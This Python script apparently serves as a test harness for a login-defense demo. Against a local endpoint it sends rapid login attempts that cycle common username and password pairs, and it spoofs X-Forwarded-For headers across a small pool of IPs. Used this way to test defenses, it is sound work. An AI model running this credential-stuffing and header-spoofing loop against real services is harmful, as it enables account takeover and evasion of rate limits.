"""Simulates a credential-stuffing attack: rapid-fire login attempts
cycling through many username/password combinations (leaked-list style),
from a small pool of source IPs, no delay between attempts.

Usage:
    python credential_stuffing.py [--base-url http://127.0.0.1:8000] [--attempts 40]
"""
import argparse
import itertools
import random

import httpx

from common import COMMON_PASSWORDS, COMMON_USERNAMES

SOURCE_IPS = ["198.51.100.23", "198.51.100.41", "198.51.100.77"]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8000")
    parser.add_argument("--attempts", type=int, default=40)
    args = parser.parse_args()

    combos = list(itertools.islice(
        ((u, p) for u in COMMON_USERNAMES for p in COMMON_PASSWORDS), args.attempts
    ))
    random.shuffle(combos)

    print(f"[cred-stuffing] launching {len(combos)} login attempts from {len(SOURCE_IPS)} source IPs...")
    with httpx.Client(base_url=args.base_url, timeout=5.0) as client:
        for i, (username, password) in enumerate(combos):
            ip = SOURCE_IPS[i % len(SOURCE_IPS)]
            r = client.post(
                "/login",
                data={"username": username, "password": password, "next": "/"},
                headers={"X-Forwarded-For": ip},
            )
            print(f"  [{ip}] {username}:{password} -> {r.status_code}")
            if r.status_code in (403, 429) and i > 5:
                print(f"[cred-stuffing] {ip} BLOCKED by defense system.")

    print("[cred-stuffing] done.")


if __name__ == "__main__":
    main()
